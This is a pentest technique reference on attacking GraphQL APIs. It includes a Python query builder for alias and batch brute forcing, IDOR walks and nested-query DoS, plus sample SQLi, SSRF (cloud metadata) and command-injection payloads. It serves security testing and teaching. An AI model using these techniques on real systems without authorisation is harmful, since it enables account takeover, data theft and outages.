---
title: "GraphQL - Introspection, Batching, Injection and DoS"
category: web
subcategory: graphql
type: technique
tags: [graphql, introspection, __schema, batching, alias-overloading, field-suggestion, clairvoyance, graphw00f, idor, node-id, ssrf, nosql, dos, query-depth, csrf, burp, inql]
difficulty: medium
summary: "Introspect the schema (or reconstruct it via field suggestions), then abuse aliases/batching for brute force, node(id) for IDOR, arguments for injection, and deep nesting for DoS."
when_to_use:
  - "An endpoint answers POST {query} at /graphql, /v1/graphql, /api/graphql or similar"
  - "A response contains 'Did you mean' suggestions (field name leak) even with introspection off"
  - "A login/coupon/OTP mutation you want to brute-force in one request via aliases"
  - "Object lookups by opaque base64 IDs (node(id:), global relay IDs)"
tools: [burp, inql, graphw00f, clairvoyance, python3]
related: [node-parameter-pollution, proto-pollution, race-conditions, node-cors-postmessage-websocket]
---

## TL;DR

GraphQL exposes one endpoint that self-describes via introspection. Grab the schema, then:
overload aliases to run hundreds of mutations in one request (rate-limit bypass), walk relay
`node(id:)` global IDs for IDOR, inject into resolver arguments (SQLi/NoSQLi/SSRF), and nest
queries deeply for DoS. When introspection is off, "Did you mean" suggestions rebuild the schema
(clairvoyance).

## Recognise it

- Endpoints: `/graphql`, `/graphiql`, `/v1/graphql`, `/api/graphql`, `/query`, `/gql`,
  `/graphql.php`, `/index.php?graphql`, `/altair`, `/playground`, `/voyager`,
  `/graphql/console`, `/subscriptions`.
- A POST with `{"query":"..."}` and a `{"data":...,"errors":...}` response.
- `GET /graphql?query={__typename}` returns `{"data":{"__typename":"Query"}}`.
- Error strings: `Cannot query field "x" on type "Y". Did you mean "z"?`,
  `Syntax Error`, `must be one of the following`.

## Theory

### Introspection

The schema is queryable at runtime:

```graphql
{ __schema { queryType { name } types { name kind fields { name } } } }
```

The full introspection query (see `## Code`) returns every type, field, argument, input object
and enum. `__type(name:"User"){fields{name type{name}}}` probes one type. If introspection is
disabled you often still get:

- **Field suggestions**: a typo yields `Did you mean "email"` -- iterate to enumerate fields
  (this is what `clairvoyance` automates).
- **`__typename`** always works and reveals the type of any selection.
- **GET vs POST**: introspection may be blocked on POST but allowed on GET, or vice versa.

### graphw00f engine fingerprinting

Different servers throw different errors and support different edge features. `graphw00f`
fingerprints: Apollo, graphql-js/express-graphql, Hasura, Graphene (Python), Ariadne, Sangria
(Scala), Juniper (Rust), gqlgen (Go), Absinthe (Elixir), Lighthouse (Laravel), graphql-ruby,
Strawberry, Dgraph, AWS AppSync, HyperGraphQL, WPGraphQL. The engine tells you which DoS and
introspection quirks apply and whether batching is on by default.

### Alias overloading vs batching

Two ways to pack many operations into one HTTP request (both defeat naive per-request rate
limits):

```graphql
# aliasing: N operations in ONE query document
{
  a: login(user:"admin", pass:"1") { token }
  b: login(user:"admin", pass:"2") { token }
  c: login(user:"admin", pass:"3") { token }
}
```

```json
// batching: a JSON array of independent operations
[{"query":"mutation{login(user:\"admin\",pass:\"1\"){token}}"},
 {"query":"mutation{login(user:\"admin\",pass:\"2\"){token}}"}]
```

Aliasing needs the field to accept the varying argument; batching runs fully separate operations
and is toggled by the server (Apollo supports it, many disable it). 2000 aliased OTP guesses in
one request is a classic OTP-brute bypass.

### Relay node IDs and IDOR

Relay global IDs are usually `base64("Type:id")`: `VXNlcjox` = `User:1`. Increment the id,
re-encode, and query `node(id:"VXNlcjoy"){... on User{email}}` to read other objects. Mutations
frequently miss object-level authorization even when queries enforce it.

### Injection through arguments

Resolver arguments flow into backends:

```graphql
{ user(id: "1 OR 1=1") { name } }            # SQLi
{ user(filter: {name: {_regex: ".*"}}) }     # NoSQL (Hasura/Mongo)
{ fetchUrl(url: "http://169.254.169.254/") } # SSRF
{ system(cmd: "id") }                         # command injection in a bad resolver
```

### DoS

- **Deep nesting / circular fragments**: `{a{b{a{b{...}}}}}` or a fragment that references
  itself. Well-configured servers reject with "fragment cycles are not allowed" or a
  depth-limit error -- the presence of that error tells you the limit exists.
- **Alias amplification**: thousands of aliases in one document multiply the work.
- **`@skip`/`@include` overloading**, field duplication, and huge `first:`/array arguments.
- **Query cost bypass**: split expensive work across aliases/batch to stay under a per-operation
  cost limit.

### CSRF and transport

- GraphQL over `GET`, or POST with `Content-Type: application/x-www-form-urlencoded` /
  `text/plain`, is a "simple request" -> CSRF if no token is required.
- Subscriptions over WebSocket may skip the auth the HTTP endpoint enforces.

## Attack

1. Find the endpoint (path list + the `?query={__typename}` probe).
2. Fingerprint with `graphw00f`; run full introspection; if blocked, use `clairvoyance` +
   field suggestions.
3. Map queries/mutations; look for `node(id:)`, auth-less mutations, and injectable arguments.
4. For rate-limited actions, pack guesses via aliases (or batch if enabled).
5. For DoS, probe nesting depth and alias limits.
6. Check CSRF (GET / form-encoded) and subscription auth.

## Code

```python
#!/usr/bin/env python3
"""GraphQL recon + attack query builder.

Builders (introspection, alias brute force, nested DoS, node-IDOR walk) are
pure and self-tested offline; probe()/run() use requests when you have a
target.
"""
from __future__ import annotations

import base64
import json
import sys

ENDPOINTS = ["/graphql", "/graphiql", "/v1/graphql", "/api/graphql", "/query",
             "/gql", "/graphql.php", "/index.php?graphql", "/altair",
             "/playground", "/voyager", "/graphql/console", "/v2/graphql"]

INTROSPECTION = """
query IntrospectionQuery {
  __schema {
    queryType { name }
    mutationType { name }
    subscriptionType { name }
    types { ...FullType }
    directives { name locations args { ...InputValue } }
  }
}
fragment FullType on __Type {
  kind name description
  fields(includeDeprecated: true) {
    name args { ...InputValue } type { ...TypeRef } isDeprecated
  }
  inputFields { ...InputValue }
  interfaces { ...TypeRef }
  enumValues(includeDeprecated: true) { name isDeprecated }
  possibleTypes { ...TypeRef }
}
fragment InputValue on __InputValue {
  name type { ...TypeRef } defaultValue
}
fragment TypeRef on __Type {
  kind name ofType { kind name ofType { kind name ofType { kind name } } }
}
""".strip()


def balanced(s: str) -> bool:
    depth = 0
    for c in s:
        if c == "{":
            depth += 1
        elif c == "}":
            depth -= 1
            if depth < 0:
                return False
    return depth == 0


def alias_brute(field: str, fixed: dict[str, str], varying_arg: str,
                values: list[str], subfields: str = "token") -> str:
    """One query document running len(values) aliased calls."""
    fixed_str = ", ".join('%s: "%s"' % (k, v) for k, v in fixed.items())
    parts = []
    for i, val in enumerate(values):
        args = (fixed_str + ", " if fixed_str else "") \
            + '%s: "%s"' % (varying_arg, val)
        parts.append('q%d: %s(%s) { %s }' % (i, field, args, subfields))
    return "{\n  " + "\n  ".join(parts) + "\n}"


def batch_brute(mutation: str, fixed: dict[str, str], varying_arg: str,
                values: list[str], subfields: str = "token") -> str:
    """A JSON array body of independent operations."""
    ops = []
    fixed_str = ", ".join('%s: \\"%s\\"' % (k, v) for k, v in fixed.items())
    for val in values:
        args = (fixed_str + ", " if fixed_str else "") \
            + '%s: \\"%s\\"' % (varying_arg, val)
        ops.append('{"query":"mutation{%s(%s){%s}}"}'
                   % (mutation, args, subfields))
    return "[" + ",".join(ops) + "]"


def nested_dos(field: str, leaf: str, depth: int) -> str:
    """A depth-`depth` self-nested query for a DoS probe."""
    body = leaf
    for _ in range(depth):
        body = "%s { %s }" % (field, body)
    return "{ %s }" % body


def relay_id(type_name: str, obj_id) -> str:
    return base64.b64encode(("%s:%s" % (type_name, obj_id)).encode()).decode()


def decode_relay_id(gid: str) -> tuple[str, str]:
    dec = base64.b64decode(gid).decode()
    t, _, i = dec.partition(":")
    return t, i


def node_idor_walk(type_name: str, ids, inline_type: str,
                   fields: str = "id email") -> list[str]:
    """One node(id:) query per candidate id."""
    return ['{ node(id: "%s") { ... on %s { %s } } }'
            % (relay_id(type_name, i), inline_type, fields) for i in ids]


def suggestion_probe(type_name: str, guess: str) -> str:
    """A deliberately-wrong field to harvest a 'Did you mean' suggestion."""
    return "{ __type(name: \"%s\") { name } %s }" % (type_name, guess)


def probe_endpoints(base: str, session=None) -> list[tuple[str, int]]:
    """Hit each candidate path with ?query={__typename}. Needs requests."""
    import requests
    s = session or requests.Session()
    out = []
    for path in ENDPOINTS:
        try:
            r = s.get(base.rstrip("/") + path, params={"query": "{__typename}"},
                      timeout=10)
            if "__typename" in r.text or r.status_code in (200, 400):
                out.append((path, r.status_code))
        except Exception:
            pass
    return out


def _self_test() -> None:
    # introspection query is well-formed
    assert balanced(INTROSPECTION), "introspection braces unbalanced"
    assert "__schema" in INTROSPECTION and "IntrospectionQuery" in INTROSPECTION
    assert "queryType" in INTROSPECTION and "mutationType" in INTROSPECTION

    # alias brute: N aliases, balanced, one document
    q = alias_brute("login", {"user": "admin"}, "pass",
                    ["1", "2", "3", "4", "5"])
    assert q.count("login(") == 5, q
    assert q.count("q0:") == 1 and "q4:" in q
    assert balanced(q)
    assert 'user: "admin"' in q and 'pass: "3"' in q

    # batch brute: a JSON array that parses, one op per value
    b = batch_brute("login", {"user": "admin"}, "pass", ["1", "2", "3"])
    arr = json.loads(b)
    assert isinstance(arr, list) and len(arr) == 3
    assert all("mutation" in op["query"] for op in arr)

    # nested DoS reaches the requested depth
    d = nested_dos("owner", "id", 8)
    assert d.count("owner") == 8 and balanced(d)
    assert d.count("{") == 9 and d.count("}") == 9   # 8 nests + outer

    # relay id round-trips
    gid = relay_id("User", 1)
    assert gid == base64.b64encode(b"User:1").decode()
    assert decode_relay_id(gid) == ("User", "1")

    # IDOR walk: one query per id, each references the next id
    walk = node_idor_walk("User", [1, 2, 3], "User")
    assert len(walk) == 3
    assert decode_relay_id(walk[2].split('"')[1]) == ("User", "3")
    assert all(balanced(x) for x in walk)

    # suggestion probe is a valid-ish document that triggers an error
    sp = suggestion_probe("User", "nonexistentField")
    assert "__type" in sp and "nonexistentField" in sp

    # endpoint list covers the usual suspects
    assert "/graphql" in ENDPOINTS and "/v1/graphql" in ENDPOINTS
    assert len(ENDPOINTS) >= 12

    print("[ok] introspection balanced, %d aliases, %d-deep DoS, relay IDOR verified"
          % (5, 8))


def main() -> int:
    if len(sys.argv) < 2:
        print("usage: %s <base_url> | (no args -> self-test)" % sys.argv[0])
        return 1
    for path, code in probe_endpoints(sys.argv[1]):
        print("%-24s %s" % (path, code))
    return 0


if __name__ == "__main__":
    if len(sys.argv) > 1:
        raise SystemExit(main())
    _self_test()
```

## Variants & pitfalls

- **Introspection off is not the end.** Field suggestions (clairvoyance), `__typename`, GET/POST
  differences, and persisted-query allowlists all leak structure.
- **Aliasing vs batching** are different toggles. If batching is disabled, aliasing still works
  inside a single document (and vice versa).
- **Mutation authz gaps**: queries often enforce authorization while mutations do not -- always
  test the mutation equivalent of a protected read.
- **`node(id:)` IDOR** needs the inline fragment `... on Type` to select fields; the id is
  usually base64 but sometimes a signed/opaque token -- decode to confirm.
- **Depth limits and cost analysis** produce specific error messages that *confirm* a defence
  and hint at the engine.
- **Injection**: GraphQL variables are typed, so `id: Int` will not take a string -- switch to a
  `String`-typed argument or an input object to reach the injection.
- **CSRF**: a JSON-only endpoint with `Content-Type` enforcement is CSRF-safe; try
  `application/x-www-form-urlencoded` / `text/plain` / GET to bypass.
- **Errors leak data**: verbose `errors[].message` and `extensions` often contain SQL, stack
  traces, or internal hostnames.
- **Rate-limit false negative**: a per-HTTP-request limiter is fully bypassed by aliasing --
  do not conclude "rate limited" from single-guess-per-request testing.

## Tools

- `graphw00f` -- engine fingerprinting.
- `clairvoyance` -- schema reconstruction from field suggestions when introspection is off.
- `InQL` (Burp) / `graphql-voyager` -- schema visualisation and query generation.
- `graphqlmap`, `crackql` -- injection and brute-force automation.
- The builders above for hand-crafting alias/batch/DoS/IDOR queries.

## References

- PortSwigger Web Security Academy -- GraphQL API vulnerabilities.
- dolevf/graphw00f, nikitastupin/clairvoyance -- project READMEs.
- OWASP -- GraphQL Cheat Sheet.
- Relay -- Global Object Identification specification.
